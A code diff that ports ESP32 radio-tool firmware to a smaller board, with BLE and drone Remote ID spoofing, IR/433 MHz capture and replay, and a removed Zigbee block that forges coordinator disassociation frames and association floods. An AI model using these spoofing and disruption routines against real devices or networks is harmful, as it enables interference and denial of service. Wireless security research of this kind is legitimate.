@@ -32608,7 +32614,7 @@ static void ble_spoof_back_cb(lv_event_t *e)
     memset(ble_spoof_target_name_str, 0, sizeof(ble_spoof_target_name_str));
     if (current_radio_mode == RADIO_MODE_BLE) {
         ESP_LOGI(TAG, "[SPOOF] cleanup: stopping instance %d", BLE_SPOOF_ADV_INSTANCE);
-        ble_gap_ext_adv_stop(BLE_SPOOF_ADV_INSTANCE);
+        ble_gap_adv_stop();
         memset(&g_ble_spoof_state, 0, sizeof(g_ble_spoof_state));
         bt_nimble_deinit();
         current_radio_mode = RADIO_MODE_NONE;
@@ -35741,14 +35747,15 @@ static esp_err_t init_battery_adc(void)
     }
     
     // Try to create calibration handle for more accurate readings
-    adc_cali_curve_fitting_config_t cali_cfg = {
+    // CYD port: classic ESP32 supports only line-fitting calibration
+    // (curve fitting is a chip with calibration-hardware feature, e.g. C5/C6)
+    adc_cali_line_fitting_config_t cali_cfg = {
         .unit_id = BATTERY_ADC_UNIT,
-        .chan = BATTERY_ADC_CHANNEL,
         .atten = BATTERY_ADC_ATTEN,
         .bitwidth = ADC_BITWIDTH_12,
     };
     
-    ret = adc_cali_create_scheme_curve_fitting(&cali_cfg, &battery_adc_cali_handle);
+    ret = adc_cali_create_scheme_line_fitting(&cali_cfg, &battery_adc_cali_handle);
     if (ret != ESP_OK) {
         ESP_LOGW(TAG, "ADC calibration not available, using raw values");
         battery_adc_cali_handle = NULL;
@@ -38469,7 +38476,7 @@ static void odid_encode_operator_id(uint8_t *msg, const char *op_id)
 
 static void drone_spoof_ble_stop(void)
 {
-    ble_gap_ext_adv_stop(DRONE_SPOOF_ADV_INSTANCE);
+    ble_gap_adv_stop();
 }
 
 /* Transmit one 25-byte ODID message as a BLE extended advertising PDU.
@@ -38483,23 +38490,12 @@ static void drone_spoof_ble_broadcast(const uint8_t *msg)
     svc_buf[2] = s_spoof_counter++;   /* rolling packet counter */
     memcpy(&svc_buf[3], msg, 25);
 
-    /* Configure advertising instance if not already running */
-    if (!ble_gap_ext_adv_active(DRONE_SPOOF_ADV_INSTANCE)) {
-        struct ble_gap_ext_adv_params p = {0};
-        p.connectable   = 0;
-        p.scannable     = 0;
-        p.legacy_pdu    = 1;           /* legacy PDU = widest receiver support */
-        p.own_addr_type = BLE_OWN_ADDR_RANDOM;
-        p.primary_phy   = BLE_HCI_LE_PHY_1M;
-        p.itvl_min      = BLE_GAP_ADV_ITVL_MS(100);
-        p.itvl_max      = BLE_GAP_ADV_ITVL_MS(200);
-        p.sid           = DRONE_SPOOF_ADV_INSTANCE;
-        int rc = ble_gap_ext_adv_configure(DRONE_SPOOF_ADV_INSTANCE, &p, NULL, NULL, NULL);
-        if (rc != 0 && rc != BLE_HS_EALREADY) {
-            ESP_LOGW(TAG, "[DRONESPOOF] configure rc=%d", rc);
-            return;
-        }
-    }
+    /* CYD port: no extended advertising on classic ESP32 — legacy non-connectable adv. */
+    struct ble_gap_adv_params p = {0};
+    p.conn_mode = BLE_GAP_CONN_MODE_NON;
+    p.disc_mode = BLE_GAP_DISC_MODE_GEN;
+    p.itvl_min  = BLE_GAP_ADV_ITVL_MS(100);
+    p.itvl_max  = BLE_GAP_ADV_ITVL_MS(200);
 
     struct ble_hs_adv_fields fields;
     memset(&fields, 0, sizeof(fields));
@@ -38507,15 +38503,16 @@ static void drone_spoof_ble_broadcast(const uint8_t *msg)
     fields.svc_data_uuid16     = svc_buf;
     fields.svc_data_uuid16_len = sizeof(svc_buf);
 
-    struct os_mbuf *om = os_msys_get_pkthdr(BLE_HS_ADV_MAX_SZ, 0);
-    if (!om) return;
-    int rc = ble_hs_adv_set_fields_mbuf(&fields, om);
-    if (rc != 0) { os_mbuf_free_chain(om); return; }
-
-    ble_gap_ext_adv_stop(DRONE_SPOOF_ADV_INSTANCE);
-    rc = ble_gap_ext_adv_set_data(DRONE_SPOOF_ADV_INSTANCE, om);
+    /* CYD port: legacy adv — flatten fields into a raw buffer */
+    uint8_t adv_buf[BLE_HS_ADV_MAX_SZ];
+    uint8_t adv_len = 0;
+    int rc = ble_hs_adv_set_fields(&fields, adv_buf, &adv_len, BLE_HS_ADV_MAX_SZ);
     if (rc != 0) return;
-    ble_gap_ext_adv_start(DRONE_SPOOF_ADV_INSTANCE, 0, 0);
+
+    ble_gap_adv_stop();
+    rc = ble_gap_adv_set_data(adv_buf, adv_len);
+    if (rc != 0) return;
+    ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &p, s_dummy_gap_event, NULL);
 }
 
 // ── WiFi beacon broadcast helper ─────────────────────────────────────────────
@@ -41357,8 +41354,11 @@ static void s_ir_edit_show_remotes(void);
 static void s_ir_edit_show_signals(void);
 
 /* Persistent arrays keep callback user-data pointers valid after the list is built. */
-EXT_RAM_BSS_ATTR static char      s_ir_edit_remote_names[IR_HAT_MAX_REMOTES][IR_HAT_REMOTE_NAME_LEN];
-EXT_RAM_BSS_ATTR static char      s_ir_edit_sig_names[IR_HAT_MAX_SIGNALS][IR_HAT_NAME_LEN];
+// CYD port: name lists halved vs PSRAM-era sizes (each 32-64B per row; UI shows ~10)
+#define IR_LIST_MAX_REMOTES  8
+#define IR_LIST_MAX_SIGNALS  12
+EXT_RAM_BSS_ATTR static char      s_ir_edit_remote_names[IR_LIST_MAX_REMOTES][IR_HAT_REMOTE_NAME_LEN];
+EXT_RAM_BSS_ATTR static char      s_ir_edit_sig_names[IR_LIST_MAX_SIGNALS][IR_HAT_NAME_LEN];
 
 static char      s_ir_edit_remote[IR_HAT_REMOTE_NAME_LEN];
 static int       s_ir_edit_sig_idx          = -1;
@@ -41704,7 +41704,7 @@ static void s_ir_edit_show_remotes(void)
     lv_obj_set_flex_align(s_ir_edit_cont, LV_FLEX_ALIGN_START,
                            LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
 
-    int count = ir_hat_list_remotes(s_ir_edit_remote_names, IR_HAT_MAX_REMOTES);
+    int count = ir_hat_list_remotes(s_ir_edit_remote_names, IR_LIST_MAX_REMOTES);
     if (count == 0) {
         lv_obj_t *lbl = lv_label_create(s_ir_edit_cont);
         lv_label_set_text(lbl, "No .ir remotes on SD card");
@@ -41833,7 +41833,7 @@ static void s_ir_edit_show_signals(void)
     lv_obj_add_event_cb(del_file_btn, s_ir_edit_del_file_from_signals_cb, LV_EVENT_CLICKED, NULL);
 
     /* Signal rows */
-    int count = ir_hat_list_signals(s_ir_edit_remote, s_ir_edit_sig_names, IR_HAT_MAX_SIGNALS);
+    int count = ir_hat_list_signals(s_ir_edit_remote, s_ir_edit_sig_names, IR_LIST_MAX_SIGNALS);
     if (count == 0) {
         lv_obj_t *lbl = lv_label_create(s_ir_edit_cont);
         lv_label_set_text(lbl, "No signals in this remote");
@@ -42026,7 +42026,7 @@ static lv_obj_t             *s_ir_save_popup      = NULL;
 static uint32_t              s_ir_cap_signal_idx  = 0;  // auto-name counter
 
 // Remote names for save picker
-EXT_RAM_BSS_ATTR static char s_ir_cap_remotes[IR_HAT_MAX_REMOTES][IR_HAT_REMOTE_NAME_LEN];
+EXT_RAM_BSS_ATTR static char s_ir_cap_remotes[IR_LIST_MAX_REMOTES][IR_HAT_REMOTE_NAME_LEN];
 static int  s_ir_cap_remote_count = 0;
 
 // Keyboard naming overlay state (multi-step: remote name → signal name → save)
@@ -42273,7 +42273,7 @@ static void ir_cap_save_cb(lv_event_t *e)
     if (s_ir_save_popup && lv_obj_is_valid(s_ir_save_popup)) return; // already open
 
     // Refresh remote list
-    s_ir_cap_remote_count = ir_hat_list_remotes(s_ir_cap_remotes, IR_HAT_MAX_REMOTES);
+    s_ir_cap_remote_count = ir_hat_list_remotes(s_ir_cap_remotes, IR_LIST_MAX_REMOTES);
 
     // Build popup
     s_ir_save_popup = lv_obj_create(lv_scr_act());
@@ -42402,7 +42402,7 @@ static void show_ir_capture_screen(void)
 
 // ── IR Replay — Level 1: remote file browser ──────────────────────────────────
 
-EXT_RAM_BSS_ATTR static char s_ir_remote_names[IR_HAT_MAX_REMOTES][IR_HAT_REMOTE_NAME_LEN];
+EXT_RAM_BSS_ATTR static char s_ir_remote_names[IR_LIST_MAX_REMOTES][IR_HAT_REMOTE_NAME_LEN];
 static int  s_ir_remote_count = 0;
 static char s_ir_cur_remote[IR_HAT_REMOTE_NAME_LEN];
 
@@ -42419,7 +42419,7 @@ static void show_ir_replay_screen(void)
     create_function_page_base("IR Replay");
     apply_menu_bg();
 
-    s_ir_remote_count = ir_hat_list_remotes(s_ir_remote_names, IR_HAT_MAX_REMOTES);
+    s_ir_remote_count = ir_hat_list_remotes(s_ir_remote_names, IR_LIST_MAX_REMOTES);
 
     lv_obj_t *hint = lv_label_create(function_page);
     lv_label_set_text(hint, s_ir_remote_count
@@ -42450,7 +42450,7 @@ static void show_ir_replay_screen(void)
 
 // ── IR Replay — Level 2: signal list within a remote ─────────────────────────
 
-EXT_RAM_BSS_ATTR static char     s_ir_signal_names[IR_HAT_MAX_SIGNALS][IR_HAT_NAME_LEN];
+EXT_RAM_BSS_ATTR static char     s_ir_signal_names[IR_LIST_MAX_SIGNALS][IR_HAT_NAME_LEN];
 static int      s_ir_signal_count = 0;
 static int      s_ir_sel_signal   = -1;
 static lv_obj_t *s_ir_sig_status  = NULL;
@@ -42500,7 +42500,7 @@ static void show_ir_signal_list_screen(void)
     apply_menu_bg();
 
     s_ir_signal_count = ir_hat_list_signals(s_ir_cur_remote,
-                                             s_ir_signal_names, IR_HAT_MAX_SIGNALS);
+                                             s_ir_signal_names, IR_LIST_MAX_SIGNALS);
     s_ir_sel_signal = -1;
 
     s_ir_sig_status = lv_label_create(function_page);
@@ -42770,7 +42770,7 @@ static lv_obj_t *s_ur_brand_lbl    = NULL;
 static lv_obj_t *s_ur_status_lbl   = NULL;
 static lv_obj_t *s_ur_search_popup = NULL;
 
-EXT_RAM_BSS_ATTR static char  s_ur_search_remotes[IR_HAT_MAX_REMOTES][IR_HAT_REMOTE_NAME_LEN];
+EXT_RAM_BSS_ATTR static char  s_ur_search_remotes[IR_LIST_MAX_REMOTES][IR_HAT_REMOTE_NAME_LEN];
 static int   s_ur_search_count = 0;
 static int   s_ur_search_idx   = 0;
 static lv_obj_t *s_ur_search_info_lbl  = NULL;
@@ -42899,7 +42899,7 @@ static void ur_search_stop_cb(lv_event_t *e)
 static void ur_search_start_cb(lv_event_t *e)
 {
     (void)e;
-    s_ur_search_count = ir_hat_list_remotes(s_ur_search_remotes, IR_HAT_MAX_REMOTES);
+    s_ur_search_count = ir_hat_list_remotes(s_ur_search_remotes, IR_LIST_MAX_REMOTES);
     s_ur_search_idx   = 0;
     if (s_ur_search_count == 0) {
         if (s_ur_status_lbl && lv_obj_is_valid(s_ur_status_lbl))
@@ -45479,13 +45479,14 @@ static void ook_age_str(int64_t last_us, char *buf, size_t sz)
 // ── RF433 OOK raw capture (GPIO9, R4A_433 demodulated output) ─────────────────
 // ISR shared with Fox Hunt but installed/removed per session — not concurrent.
 static volatile bool     s_rf433_ook_cap_active = false;
-static volatile int32_t  s_rf433_ook_buf[2048];
+// CYD port: 256 entries (was 2048) — 7KB saved; still ~1s of raw OOK capture.
+static volatile int32_t  s_rf433_ook_buf[256];
 static volatile int      s_rf433_ook_wr   = 0;
 static volatile int64_t  s_rf433_ook_last = 0;
 
 IRAM_ATTR static void s_rf433_ook_cap_isr(void *arg)
 {
-    if (!s_rf433_ook_cap_active || s_rf433_ook_wr >= 2047) return;
+    if (!s_rf433_ook_cap_active || s_rf433_ook_wr >= 255) return;
     int64_t now = esp_timer_get_time();
     if (s_rf433_ook_last == 0) { s_rf433_ook_last = now; return; }
     int64_t dt = now - s_rf433_ook_last;
@@ -49551,7 +49552,7 @@ static bool        s_sm_needs_refresh = false;
 /* File browser state — populated when long-press opens the browser popup */
 static lv_obj_t  *s_fb_popup         = NULL;
 static int         s_fb_target_slot   = -1;
-#define CHAM_FB_MAX_FILES 16
+#define CHAM_FB_MAX_FILES 8
 static char s_fb_lf_files[CHAM_FB_MAX_FILES][52]; /* full paths to .rfid files */
 static int  s_fb_lf_count = 0;
 static char s_fb_hf_files[CHAM_FB_MAX_FILES][52]; /* full paths to .nfc files */
@@ -52289,7 +52290,7 @@ static void s_rf433_scan_lvgl_cb(void *arg)
 static void s_rf433_scan_task_fn(void *arg)
 {
     (void)arg;
-    static int32_t buf[2048];
+    static int32_t buf[384]; // CYD port: 2048→384 (8KB→1.5KB DRAM)
     while (!s_rf433_scan_stop) {
         int count = 0;
         rf433_ook_capture(buf, &count, 700);
@@ -53170,8 +53171,8 @@ static void show_rfid_hw_test_screen(void)
 
 // ── Saved Cards ───────────────────────────────────────────────────────────────
 
-#define RFID_MAX_LIST_DISPLAY  20
-#define RFID_MAX_IMPORT_FILES  10
+#define RFID_MAX_LIST_DISPLAY  5
+#define RFID_MAX_IMPORT_FILES  6
 
 EXT_RAM_BSS_ATTR static rfid_card_entry_t s_rfid_entries[RFID_MAX_LIST_DISPLAY];
 static int               s_rfid_entry_count = 0;
@@ -54085,7 +54086,7 @@ static volatile rf433_hat_err_t     s_rf433_cap_result   = RF433_HAT_ERR_TIMEOUT
 static lv_obj_t                    *s_rf433_save_popup   = NULL;
 static uint32_t                     s_rf433_cap_sig_idx  = 0;  // auto-name counter
 
-EXT_RAM_BSS_ATTR static char s_rf433_cap_remotes[RF433_HAT_MAX_REMOTES][RF433_HAT_REMOTE_NAME_LEN];
+EXT_RAM_BSS_ATTR static char s_rf433_cap_remotes[IR_LIST_MAX_REMOTES][RF433_HAT_REMOTE_NAME_LEN];
 static int  s_rf433_cap_remote_count = 0;
 
 static void s_rf433_ui_update(void *arg)
@@ -54196,7 +54197,7 @@ static void rf433_cap_save_cb(lv_event_t *e)
     if (s_rf433_save_popup && lv_obj_is_valid(s_rf433_save_popup)) return;
 
     s_rf433_cap_remote_count = rf433_hat_list_remotes(s_rf433_cap_remotes,
-                                                       RF433_HAT_MAX_REMOTES);
+                                                       IR_LIST_MAX_REMOTES);
 
     s_rf433_save_popup = lv_obj_create(lv_scr_act());
     lv_obj_set_size(s_rf433_save_popup, 210, 240);
@@ -54301,7 +54302,7 @@ static void show_rf433_capture_screen(void)
 
 // ── RF433 Replay — Level 1: remote (directory) list ──────────────────────────
 
-EXT_RAM_BSS_ATTR static char s_rf433_remote_names[RF433_HAT_MAX_REMOTES][RF433_HAT_REMOTE_NAME_LEN];
+EXT_RAM_BSS_ATTR static char s_rf433_remote_names[IR_LIST_MAX_REMOTES][RF433_HAT_REMOTE_NAME_LEN];
 static int  s_rf433_remote_count = 0;
 static char s_rf433_cur_remote[RF433_HAT_REMOTE_NAME_LEN];
 
@@ -54318,7 +54319,7 @@ static void show_rf433_replay_screen(void)
     create_function_page_base("RF433 Replay");
     apply_menu_bg();
 
-    s_rf433_remote_count = rf433_hat_list_remotes(s_rf433_remote_names, RF433_HAT_MAX_REMOTES);
+    s_rf433_remote_count = rf433_hat_list_remotes(s_rf433_remote_names, IR_LIST_MAX_REMOTES);
 
     lv_obj_t *hint = lv_label_create(function_page);
     lv_label_set_text(hint, s_rf433_remote_count
@@ -54351,7 +54352,7 @@ static void show_rf433_replay_screen(void)
 
 // ── RF433 Replay — Level 2: signal list inside a remote ──────────────────────
 
-EXT_RAM_BSS_ATTR static char     s_rf433_signal_names[RF433_HAT_MAX_SIGNALS][RF433_HAT_NAME_LEN];
+EXT_RAM_BSS_ATTR static char     s_rf433_signal_names[IR_LIST_MAX_SIGNALS][RF433_HAT_NAME_LEN];
 static int      s_rf433_signal_count = 0;
 static int      s_rf433_sel_signal   = -1;
 static lv_obj_t *s_rf433_sig_status  = NULL;
@@ -54397,7 +54398,7 @@ static void show_rf433_signal_list_screen(void)
 
     s_rf433_signal_count = rf433_hat_list_signals(s_rf433_cur_remote,
                                                    s_rf433_signal_names,
-                                                   RF433_HAT_MAX_SIGNALS);
+                                                   IR_LIST_MAX_SIGNALS);
     s_rf433_sel_signal = -1;
 
     s_rf433_sig_status = lv_label_create(function_page);
@@ -54437,1251 +54438,6 @@ static void show_rf433_signal_list_screen(void)
     lv_obj_add_event_cb(tx_btn, rf433_do_replay_cb, LV_EVENT_CLICKED, NULL);
 
     rfhat_add_back_btn(s_rf433_cur_remote, show_rf433_replay_screen);
-}
-
-// =============================================================================
-// Zigbee Scout — passive 802.15.4 wardrive using ESP32-C5 built-in radio
-// FOR AUTHORIZED SECURITY RESEARCH AND EDUCATION ONLY.
-// Channels 11-26 (2405-2480 MHz, 5 MHz steps). Saves CSV + PCAP to SD card.
-// WiFi is stopped before 802.15.4 is enabled; restarted on exit.
-// =============================================================================
-
-// ── 802.15.4 RX callback (ISR context — must be in IRAM) ─────────────────────
-
-static IRAM_ATTR void s_zgwd_rx_done_cb(uint8_t *frame,
-                                         esp_ieee802154_frame_info_t *fi)
-{
-    bool scout_active = s_zgwd && s_zgwd->scanning;
-    bool locator_active = s_zgwd_loc && s_zgwd_loc->running;
-    if (!s_zgwd_rx_q || (!scout_active && !locator_active)) {
-        esp_ieee802154_receive_handle_done(frame);
-        return;
-    }
-    // frame[0] = total length including 2-byte FCS slot (occupied by RSSI/LQI).
-    // frame[1..frame[0]-2] = MAC data (MHR + payload), frame[frame[0]-1..frame[0]] = RSSI/LQI.
-    uint8_t raw_len = frame[0];
-    uint8_t mac_len = (raw_len >= 2) ? (raw_len - 2) : 0;
-    if (mac_len > 127) mac_len = 127;
-
-    zgwd_frame_msg_t msg;
-    msg.len     = mac_len;
-    msg.rssi    = fi->rssi;
-    msg.lqi     = fi->lqi;
-    msg.channel = fi->channel;
-    if (mac_len > 0) memcpy(msg.data, frame + 1, mac_len);
-
-    BaseType_t woken = pdFALSE;
-    xQueueSendFromISR(s_zgwd_rx_q, &msg, &woken);
-    esp_ieee802154_receive_handle_done(frame);
-    portYIELD_FROM_ISR(woken);
-}
-
-// Required 802.15.4 weak-symbol stubs (only rx done is used here)
-void IRAM_ATTR esp_ieee802154_receive_done(uint8_t *frame,
-                                            esp_ieee802154_frame_info_t *frame_info)
-{
-    s_zgwd_rx_done_cb(frame, frame_info);
-}
-void IRAM_ATTR esp_ieee802154_receive_sfd_done(void) {}
-void IRAM_ATTR esp_ieee802154_transmit_done(const uint8_t *f, const uint8_t *a,
-                                             esp_ieee802154_frame_info_t *i)
-{
-    (void)f; (void)a; (void)i;
-    if (s_zgwd_tx_sem) {
-        BaseType_t woken = pdFALSE;
-        xSemaphoreGiveFromISR(s_zgwd_tx_sem, &woken);
-        portYIELD_FROM_ISR(woken);
-    }
-}
-void IRAM_ATTR esp_ieee802154_transmit_failed(const uint8_t *f,
-                                               esp_ieee802154_tx_error_t e)
-{ (void)f; (void)e; }
-void IRAM_ATTR esp_ieee802154_transmit_sfd_done(uint8_t *f) { (void)f; }
-void IRAM_ATTR esp_ieee802154_energy_detect_done(int8_t p)  { (void)p; }
-void IRAM_ATTR esp_ieee802154_receive_at_done(void) {}
-esp_err_t esp_ieee802154_enh_ack_generator(uint8_t *f,
-                                            esp_ieee802154_frame_info_t *fi,
-                                            uint8_t *enhack)
-{ (void)f; (void)fi; (void)enhack; return ESP_FAIL; }
-
-// ── PCAP file helpers ─────────────────────────────────────────────────────────
-#define ZGWD_DLT_IEEE802_15_4_NOFCS  230
-
-static void s_zgwd_pcap_write_global_hdr(FILE *f)
-{
-    // PCAP global header (magic, major, minor, thiszone, sigfigs, snaplen, dlt)
-    uint32_t hdr[6] = { 0xA1B2C3D4, (2 << 16) | 4, 0, 0, 256, ZGWD_DLT_IEEE802_15_4_NOFCS };
-    fwrite(hdr, sizeof(hdr), 1, f);
-}
-
-static void s_zgwd_pcap_write_frame(FILE *f, const zgwd_frame_msg_t *msg,
-                                     uint64_t ts_us)
-{
-    uint32_t sec  = (uint32_t)(ts_us / 1000000ULL);
-    uint32_t usec = (uint32_t)(ts_us % 1000000ULL);
-    uint32_t rec[4] = { sec, usec, msg->len, msg->len };
-    fwrite(rec, sizeof(rec), 1, f);
-    fwrite(msg->data, 1, msg->len, f);
-}
-
-// ── 802.15.4 frame parser ─────────────────────────────────────────────────────
-typedef struct {
-    uint16_t pan_id;      // 0xFFFF = not found
-    uint16_t src_short;   // 0xFFFF = not present
-    uint64_t src_ext;     // 0 = not present
-    uint64_t ext_pan_id;  // from beacon payload, 0 = not present
-    uint8_t  stack_profile;
-    bool     router_cap;
-    bool     end_dev_cap;
-    uint8_t  frame_type;  // ZGWD_FT_*
-} zgwd_parsed_t;
-
-static void s_zgwd_parse_frame(const uint8_t *mac, uint8_t len, zgwd_parsed_t *out)
-{
-    memset(out, 0, sizeof(*out));
-    out->pan_id    = 0xFFFF;
-    out->src_short = 0xFFFF;
-    if (len < 3) return;
-
-    uint16_t fc = (uint16_t)mac[0] | ((uint16_t)mac[1] << 8);
-    uint8_t  ftype    = fc & 0x07;
-    uint8_t  dst_mode = (fc >> 10) & 0x03;
-    uint8_t  src_mode = (fc >> 14) & 0x03;
-    bool     pan_comp = (fc >> 6) & 0x01;
-
-    switch (ftype) {
-        case 0: out->frame_type = ZGWD_FT_BEACON; break;
-        case 1: out->frame_type = ZGWD_FT_DATA;   break;
-        case 2: out->frame_type = ZGWD_FT_ACK;    break;
-        case 3: out->frame_type = ZGWD_FT_CMD;    break;
-        default: out->frame_type = 0;              break;
-    }
-
-    // Walk the MAC header: FC(2) + Seq(1) + addressing fields
-    int off = 3;
-
-    // Destination PAN + address
-    if (dst_mode == 2 || dst_mode == 3) {
-        if (off + 2 > len) return;
-        out->pan_id = (uint16_t)mac[off] | ((uint16_t)mac[off+1] << 8);
-        off += 2;
-        off += (dst_mode == 2) ? 2 : 8; // 16-bit or 64-bit dst addr
-    }
-
-    // Source PAN (omitted if PAN compressed and dst present)
-    uint16_t src_pan = out->pan_id;
-    if (src_mode != 0 && !(pan_comp && dst_mode != 0)) {
-        if (off + 2 > len) return;
-        src_pan = (uint16_t)mac[off] | ((uint16_t)mac[off+1] << 8);
-        if (out->pan_id == 0xFFFF) out->pan_id = src_pan;
-        off += 2;
-    }
-
-    // Source address
-    if (src_mode == 2) {
-        if (off + 2 <= len)
-            out->src_short = (uint16_t)mac[off] | ((uint16_t)mac[off+1] << 8);
-        off += 2;
-    } else if (src_mode == 3) {
-        if (off + 8 <= len) {
-            uint64_t ext = 0;
-            for (int i = 0; i < 8; i++) ext |= ((uint64_t)mac[off+i]) << (8*i);
-            out->src_ext = ext;
-        }
-        off += 8;
-    }
-
-    // Beacon payload: SuperFrame(2) + GTS(1) + Pending(1) + Zigbee beacon(at least 15 bytes)
-    if (ftype == 0 && off + 4 <= len) {
-        off += 4; // skip SuperFrame + GTS + Pending
-        // Zigbee beacon: byte 0 bits[3:0]=StackProfile bits[7:4]=ProtoVer
-        //                byte 1 bit2=RouterCap bit7=EndDevCap
-        //                bytes 2-9 = Extended PAN ID (LE)
-        if (off + 10 <= len) {
-            uint8_t b0 = mac[off];
-            uint8_t b1 = mac[off+1];
-            out->stack_profile = b0 & 0x0F;
-            out->router_cap    = (b1 >> 2) & 1;
-            out->end_dev_cap   = (b1 >> 7) & 1;
-            uint64_t epid = 0;
-            for (int i = 0; i < 8; i++) epid |= ((uint64_t)mac[off+2+i]) << (8*i);
-            out->ext_pan_id = epid;
-        }
-    }
-}
-
-// ── TX helpers (beacon request / disassoc / assoc flood) ─────────────────────
-static void s_zgwd_tx_wait(void)
-{
-    if (s_zgwd_tx_sem) xSemaphoreTake(s_zgwd_tx_sem, pdMS_TO_TICKS(25));
-}
-
-static void s_zgwd_send_beacon_req(void)
-{
-    // Command frame, dst=16-bit broadcast, src=none
-    static uint8_t buf[11];
-    buf[0]  = 10;    // len: 8 MAC + 2 FCS
-    buf[1]  = 0x03;  // FC_LOW: cmd, no ack
-    buf[2]  = 0x08;  // FC_HIGH: dst=16-bit, src=none
-    buf[3]  = s_zgwd_seq++;
-    buf[4]  = 0xFF; buf[5] = 0xFF; // DstPAN broadcast
-    buf[6]  = 0xFF; buf[7] = 0xFF; // DstAddr broadcast
-    buf[8]  = 0x07;  // Beacon Request
-    buf[9]  = 0x00; buf[10] = 0x00; // FCS placeholder
-    esp_ieee802154_transmit(buf, false);
-    s_zgwd_tx_wait();
-}
-
-static void s_zgwd_send_disassoc(uint16_t pan_id, uint16_t dev_addr)
-{
-    // Command frame, ack req, PAN compressed, 16-bit src+dst
-    static uint8_t buf[14];
-    buf[0]  = 13;    // len: 11 MAC + 2 FCS
-    buf[1]  = 0x63;  // FC_LOW: cmd, ack, pan-comp
-    buf[2]  = 0x88;  // FC_HIGH: dst=16-bit, src=16-bit
-    buf[3]  = s_zgwd_seq++;
-    buf[4]  = pan_id & 0xFF; buf[5] = pan_id >> 8; // DstPAN
-    buf[6]  = dev_addr & 0xFF; buf[7] = dev_addr >> 8; // DstAddr
-    buf[8]  = 0x00; buf[9] = 0x00;  // SrcAddr = coordinator (0x0000)
-    buf[10] = 0x03;  // Disassociation Notification
-    buf[11] = 0x01;  // Reason: coord wants device to leave
-    buf[12] = 0x00; buf[13] = 0x00; // FCS placeholder
-    esp_ieee802154_transmit(buf, false);
-    s_zgwd_tx_wait();
-}
-
-static void s_zgwd_send_assoc_req(uint16_t pan_id)
-{
-    // Command frame, ack req, no PAN compress, dst=16-bit, src=64-bit
-    static uint8_t buf[22];
-    buf[0]  = 21;    // len: 19 MAC + 2 FCS
-    buf[1]  = 0x23;  // FC_LOW: cmd, ack req
-    buf[2]  = 0xC8;  // FC_HIGH: dst=16-bit, src=64-bit
-    buf[3]  = s_zgwd_seq++;
-    buf[4]  = pan_id & 0xFF; buf[5] = pan_id >> 8; // DstPAN
-    buf[6]  = 0x00; buf[7] = 0x00; // DstAddr = coordinator
-    buf[8]  = 0xFF; buf[9] = 0xFF; // SrcPAN = unassociated
-    // Random EUI-64 (bytes 10-17)
-    for (int i = 0; i < 8; i++) buf[10+i] = (uint8_t)(esp_random() & 0xFF);
-    buf[10] = 0x02; // locally administered bit
-    buf[18] = 0x01; // Association Request
-    buf[19] = 0x8E; // Capability: FFD, mains, RX-on, alloc addr
-    buf[20] = 0x00; buf[21] = 0x00; // FCS placeholder
-    esp_ieee802154_transmit(buf, false);
-    s_zgwd_tx_wait();
-}
-
-// ── Wardrive background task ──────────────────────────────────────────────────
-static void s_zgwd_task_fn(void *arg)
-{
-    zgwd_ctx_t *ctx = (zgwd_ctx_t *)arg;
-    bool active_mode = ctx->active_mode;
-    ESP_LOGI(TAG, "[ZGWD] Zigbee Scout started mode=%s", active_mode ? "ACTIVE" : "PASSIVE");
-
-    FILE *csv  = NULL;
-    FILE *pcap = NULL;
-
-    if (current_radio_mode == RADIO_MODE_WIFI) {
-        esp_wifi_set_promiscuous(false);
-        esp_wifi_stop();
-        esp_wifi_deinit();
-        wifi_initialized = false;
-        current_radio_mode = RADIO_MODE_NONE;
-    } else if (current_radio_mode == RADIO_MODE_BLE) {
-        bt_nimble_deinit();
-        current_radio_mode = RADIO_MODE_NONE;
-    }
-
-    if (!s_zgwd_tx_sem)
-        s_zgwd_tx_sem = xSemaphoreCreateBinary();
-
-    // Quiesce WS2812 RMT channel before 802.15.4 enable (which calls rmt_tx_wait_all_done)
-    if (g_led_strip) { led_strip_clear(g_led_strip); vTaskDelay(pdMS_TO_TICKS(5)); }
-
-    if (esp_ieee802154_enable() != ESP_OK) {
-        ESP_LOGE(TAG, "[ZGWD] 802.15.4 enable failed");
-        goto zgwd_done;
-    }
-
-    // Open SD files after radio is up — SPI DMA must not be in flight during PHY enable
-    if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
-    struct stat st = {0};
-    if (stat("/sdcard/lab", &st) == -1) mkdir("/sdcard/lab", 0777);
-    if (stat(ZGWD_SAVE_DIR, &st) == -1) mkdir(ZGWD_SAVE_DIR, 0755);
-
-    uint64_t ts_base = (uint64_t)(esp_timer_get_time() / 1000000);
-    snprintf(ctx->csv_path, sizeof(ctx->csv_path),
-             ZGWD_SAVE_DIR "/zgwd%llu.csv", (unsigned long long)ts_base);
-    snprintf(ctx->pcap_path, sizeof(ctx->pcap_path),
-             ZGWD_SAVE_DIR "/zgwd%llu.pcap", (unsigned long long)ts_base);
-
-    csv  = fopen(ctx->csv_path, "w");
-    pcap = fopen(ctx->pcap_path, "wb");
-    if (csv)  fprintf(csv, "timestamp_us,channel,pan_id,rssi,lqi,frame_len,frame_type,ext_pan_id,stack_profile\n");
-    if (pcap) s_zgwd_pcap_write_global_hdr(pcap);
-    if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
-    esp_ieee802154_set_promiscuous(true);
-    esp_ieee802154_set_coordinator(false);
-    esp_ieee802154_set_panid(0xFFFF);
-    esp_ieee802154_set_short_address(0xFFFE);
-
-    const uint8_t channels[] = { 11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 };
-    const int     num_ch     = (int)(sizeof(channels)/sizeof(channels[0]));
-    int           ch_idx     = 0;
-
-    while (!ctx->cancel) {
-        uint8_t ch = channels[ch_idx];
-        ctx->current_channel = ch;
-
-        esp_ieee802154_set_channel(ch);
-        esp_ieee802154_receive();
-
-        // Active mode: send beacon request then listen
-        if (active_mode) {
-            s_zgwd_send_beacon_req();
-            esp_ieee802154_receive();
-        }
-
-        TickType_t deadline = xTaskGetTickCount() + pdMS_TO_TICKS(ZGWD_DWELL_MS);
-        while (!ctx->cancel && xTaskGetTickCount() < deadline) {
-            zgwd_frame_msg_t msg;
-            if (xQueueReceive(s_zgwd_rx_q, &msg, pdMS_TO_TICKS(20)) == pdTRUE) {
-                uint64_t ts = (uint64_t)esp_timer_get_time();
-                ctx->frame_count++;
-
-                zgwd_parsed_t parsed;
-                s_zgwd_parse_frame(msg.data, msg.len, &parsed);
